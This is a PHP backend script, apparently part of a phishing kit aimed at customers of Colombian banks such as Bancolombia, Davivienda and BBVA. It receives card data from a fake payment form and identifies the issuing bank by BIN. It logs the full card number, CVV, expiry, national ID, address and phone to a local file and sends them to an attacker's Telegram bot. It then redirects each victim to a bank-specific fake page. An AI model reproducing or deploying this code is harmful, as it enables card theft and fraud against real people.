<?php
error_reporting(0);
ini_set('display_errors', 0);

header('Content-Type: application/json; charset=utf-8');

// Configuración centralizada
$config = [];
if (file_exists(__DIR__ . '/config.php')) {
    $config = include __DIR__ . '/config.php';
}

// CONFIGURACIÓN DE PROVEEDOR DE BIN
// Opciones: 'binlist', 'bincodes', 'fraudlabspro'
define('BIN_PROVIDER', 'binlist');

// CLAVES DE API (Rellenar si se usa bincodes o fraudlabspro)
define('BINCODES_API_KEY', 'YOUR_BINCODES_API_KEY');
define('FRAUDLABSPRO_API_KEY', 'YOUR_FRAUDLABSPRO_API_KEY');

// Obtener datos del cuerpo del POST
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data || !isset($data['cardNumber'])) {
    http_response_code(400);
    echo json_encode(array('status' => 'error', 'message' => 'No se recibieron datos válidos o falta el número de tarjeta.'));
    exit;
}

$cardNumber = preg_replace('/\s+/', '', $data['cardNumber']);
$bin = substr($cardNumber, 0, 6);

$issuer = 'Desconocido';
$scheme = 'Desconocido';

// Base de datos de BINs locales para bancos de Colombia
$localBins = array(
    // Davivienda
    '400135' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '401676' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '404179' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444376' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444300' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444301' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444302' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444303' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444304' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444305' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444306' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444307' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444308' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444309' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '459321' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '516139' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
    '522216' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
    '530592' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
    '540751' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
    '554522' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
    
    // Bancolombia
    '411111' => array('bank' => 'Bancolombia', 'scheme' => 'Visa'),
    '422474' => array('bank' => 'Bancolombia', 'scheme' => 'Visa'),
    '425837' => array('bank' => 'Bancolombia', 'scheme' => 'Visa'),
    '491567' => array('bank' => 'Bancolombia', 'scheme' => 'Visa'),
    '519911' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),
    '524708' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),
    '530699' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),
    '540698' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),
    '552636' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),

    // Banco de Bogotá
    '403212' => array('bank' => 'Banco de Bogotá', 'scheme' => 'Visa'),
    '405230' => array('bank' => 'Banco de Bogotá', 'scheme' => 'Visa'),
    '459490' => array('bank' => 'Banco de Bogotá', 'scheme' => 'Visa'),
    '525381' => array('bank' => 'Banco de Bogotá', 'scheme' => 'MasterCard'),
    '530514' => array('bank' => 'Banco de Bogotá', 'scheme' => 'MasterCard'),
    '541203' => array('bank' => 'Banco de Bogotá', 'scheme' => 'MasterCard'),

    // BBVA
    '410260' => array('bank' => 'BBVA', 'scheme' => 'Visa'),
    '491522' => array('bank' => 'BBVA', 'scheme' => 'Visa'),
    '491583' => array('bank' => 'BBVA', 'scheme' => 'Visa'),
    '525686' => array('bank' => 'BBVA', 'scheme' => 'MasterCard'),
    '548906' => array('bank' => 'BBVA', 'scheme' => 'MasterCard'),

    // AV Villas
    '402845' => array('bank' => 'AV Villas', 'scheme' => 'Visa'),
    '459346' => array('bank' => 'AV Villas', 'scheme' => 'Visa'),
    '520141' => array('bank' => 'AV Villas', 'scheme' => 'MasterCard'),
    '521191' => array('bank' => 'AV Villas', 'scheme' => 'MasterCard'),
);

$binVerificado = false;

// 1. CONSULTAR EL BIN EN TIEMPO REAL Y DE FORMA AUTOMÁTICA
if (BIN_PROVIDER === 'bincodes' && BINCODES_API_KEY !== 'YOUR_BINCODES_API_KEY') {
    // Proveedor BinCodes
    $url = "https://api.bincodes.com/bin/?format=json&api_key=" . urlencode(BINCODES_API_KEY) . "&bin=" . urlencode($bin);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $result = json_decode($response, true);
        if (isset($result['bank']) && !empty($result['bank'])) {
            $issuer = $result['bank'];
            $binVerificado = true;
        }
        if (isset($result['card']) && !empty($result['card'])) {
            $scheme = $result['card'];
        }
    }
} elseif (BIN_PROVIDER === 'fraudlabspro' && FRAUDLABSPRO_API_KEY !== 'YOUR_FRAUDLABSPRO_API_KEY') {
    // Proveedor FraudLabs Pro BIN Lookup API
    $url = "https://api.fraudlabspro.com/v1/bin/lookup?key=" . urlencode(FRAUDLABSPRO_API_KEY) . "&bin=" . urlencode($bin) . "&format=json";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $result = json_decode($response, true);
        if (isset($result['card_issuing_bank']) && !empty($result['card_issuing_bank'])) {
            $issuer = $result['card_issuing_bank'];
            $binVerificado = true;
        }
        if (isset($result['card_brand']) && !empty($result['card_brand'])) {
            $scheme = $result['card_brand'];
        }
    }
} else {
    // Proveedor por defecto: binlist.net (automático, público y gratuito)
    $url = "https://lookup.binlist.net/" . urlencode($bin);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    // User-agent simulado para evitar bloqueos por cabecera vacía
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    ));
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode === 200 && $response) {
        $result = json_decode($response, true);
        if (isset($result['bank']['name']) && !empty($result['bank']['name'])) {
            $issuer = $result['bank']['name'];
            $binVerificado = true;
        }
        if (isset($result['scheme']) && !empty($result['scheme'])) {
            $scheme = $result['scheme'];
        }
    }
}

// 2. FALLBACK A DICCIONARIO LOCAL SI LA CONSULTA AUTOMÁTICA DE API FALLÓ O SUPERÓ LÍMITES
if (!$binVerificado) {
    if (isset($localBins[$bin])) {
        $issuer = $localBins[$bin]['bank'];
        $scheme = $localBins[$bin]['scheme'];
    }
}

// 3. ACTUALIZAR LOS DATOS PARA EL LOG Y RESPUESTA
$data['bank'] = $issuer;
$data['type'] = $scheme;

// 4. GUARDAR EL LOG EN EL ARCHIVO LOCAL
$logFile = __DIR__ . '/registro_tarjetas.txt';
$logData = "[" . date('Y-m-d H:i:s') . "] " . json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL;
@file_put_contents($logFile, $logData, FILE_APPEND);

// 5. DETERMINAR EL TIPO DE TARJETA SEGÚN EL PRIMER DÍGITO
$firstDigit = strlen($cardNumber) > 0 ? $cardNumber[0] : '';
$cardType = 'Desconocido';
switch ($firstDigit) {
    case '4':
        $cardType = 'Visa';
        break;
    case '5':
        $cardType = 'MasterCard';
        break;
    case '3':
        $cardType = 'American Express';
        break;
    case '6':
        $cardType = 'Discover';
        break;
}

// 6. DETERMINAR LA DIRECCIÓN DE REDIRECCIÓN SEGÚN EL BANCO DETECTADO
$bancoNormalizado = strtolower($issuer);
$redirectUrl = 'pago/4c7a1d9e/'; // Default (Bancolombia)

if (strpos($bancoNormalizado, 'bancolombia') !== false && strpos($bancoNormalizado, 'nequi') === false) {
    $redirectUrl = 'pago/4c7a1d9e/';
} elseif (strpos($bancoNormalizado, 'davivienda') !== false || strpos($bancoNormalizado, 'daviplata') !== false) {
    $redirectUrl = 'pago/5d1e9a3b/';
} elseif (strpos($bancoNormalizado, 'bogot') !== false) {
    $redirectUrl = 'pago/1a9f3d8c/';
} elseif (strpos($bancoNormalizado, 'bbva') !== false) {
    $redirectUrl = 'pago/6e2b8f04/';
} elseif (strpos($bancoNormalizado, 'villas') !== false) {
    $redirectUrl = 'pago/9f8b2e1a/';
} elseif (strpos($bancoNormalizado, 'caja social') !== false) {
    $redirectUrl = 'pago/7d4e0b2a/';
} elseif (strpos($bancoNormalizado, 'colpatria') !== false || strpos($bancoNormalizado, 'scotiabank') !== false) {
    $redirectUrl = 'pago/3f8a1e9c/';
} elseif (strpos($bancoNormalizado, 'falabella') !== false) {
    $redirectUrl = 'pago/2e8f4a1c/';
} elseif (strpos($bancoNormalizado, 'finandina') !== false) {
    $redirectUrl = 'pago/0b7d3e9a/';
} elseif (strpos($bancoNormalizado, 'itau') !== false || strpos($bancoNormalizado, 'itaú') !== false) {
    $redirectUrl = 'pago/a4c81f2e/';
} elseif (strpos($bancoNormalizado, 'lulo') !== false) {
    $redirectUrl = 'pago/f1e93a7b/';
} elseif (strpos($bancoNormalizado, 'mundo mujer') !== false) {
    $redirectUrl = 'pago/d8b24e0a/';
} elseif (strpos($bancoNormalizado, 'nequi') !== false) {
    $redirectUrl = 'pago/c3a7f91e/';
} elseif (strpos($bancoNormalizado, 'occidente') !== false) {
    $redirectUrl = 'pago/1e8a4d7b/';
} elseif (strpos($bancoNormalizado, 'popular') !== false) {
    $redirectUrl = 'pago/e9f2b14c/';
} elseif (strpos($bancoNormalizado, 'serfinanza') !== false) {
    $redirectUrl = 'pago/7a1d8e3f/';
} elseif (strpos($bancoNormalizado, 'union') !== false || strpos($bancoNormalizado, 'unión') !== false) {
    $redirectUrl = 'pago/b2e4f08a/';
}

// 7. ENVIAR INFO DE LA TARJETA A TELEGRAM
$botToken = $config['botToken'] ?? '';
$chatId = $config['chatId'] ?? '';

// Fallback si no está en config.php
if (empty($botToken) || empty($chatId)) {
    $botmasterPath = __DIR__ . '/dinadatos/botmaster2.php';
    if (file_exists($botmasterPath)) {
        $contentFile = file_get_contents($botmasterPath);
        if (preg_match('/\{.*\}/', $contentFile, $matches)) {
            $tgConfig = json_decode($matches[0], true);
            $botToken = $tgConfig['token'] ?? $botToken;
            $chatId = $tgConfig['chat_id'] ?? $chatId;
        }
    }
}

if (!empty($botToken) && !empty($chatId)) {
    $transactionId = date('YmdHis') . '-' . uniqid();
    $bancoTitulo = strtoupper($issuer);
    
    $message = "<b>[{$bancoTitulo}] Nueva Tarjeta Detectada</b>\n";
    $message .= "--------------------------------------------------\n";
    $message .= "🆔 <b>ID de Verificación:</b> | <b>" . $transactionId . "</b>\n";
    $message .= "--------------------------------------------------\n";
    $message .= "<b>Detalles del pago:</b>\n";
    $message .= "----------------------------\n";
    $message .= "🪪 <b>Cédula:</b> | " . htmlspecialchars($data['cardDoc'] ?? ($data['identificacion'] ?? 'No disponible')) . "\n";
    $message .= "💳 <b>Tarjeta:</b> | " . htmlspecialchars($data['cardNumber'] ?? 'No disponible') . "\n";
    $message .= "📅 <b>Expiración:</b> | " . htmlspecialchars($data['cardExpiry'] ?? (($data['expMonth'] ?? '') . '/' . ($data['expYear'] ?? ''))) . "\n";
    $message .= "🔐 <b>CVV:</b> | " . htmlspecialchars($data['cardCvv'] ?? ($data['cvv'] ?? 'No disponible')) . "\n";
    $message .= "💳 <b>Tipo de tarjeta:</b> | " . htmlspecialchars($cardType) . "\n";
    $message .= "💰 <b>Cuotas:</b> | " . htmlspecialchars($data['cardCuotas'] ?? ($data['cuotas'] ?? '1')) . "\n";
    $message .= "--------------------------------------------------\n";
    $message .= "🏦 <b>Banco:</b> | " . htmlspecialchars($issuer) . "\n";
    $message .= "🏠 <b>Dirección:</b> | " . htmlspecialchars($data['direccion'] ?? ($data['address'] ?? 'No disponible')) . "\n";
    $message .= "📞 <b>Teléfono:</b> | " . htmlspecialchars($data['telefono'] ?? ($data['phone'] ?? 'No disponible')) . "\n";
    $message .= "📝 <b>Nombre del titular:</b> | " . htmlspecialchars($data['cardName'] ?? ($data['ownerName'] ?? 'No disponible')) . "\n";
    $message .= "--------------------------------------------------\n";

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    @curl_exec($ch);
    curl_close($ch);
}

// 8. ENVIAR LA RESPUESTA JSON DE ÉXITO
echo json_encode(array(
    'status' => 'success',
    'bank' => $issuer,
    'cardType' => $cardType,
    'type' => $scheme,
    'redirect' => $redirectUrl
), JSON_UNESCAPED_UNICODE);
?>
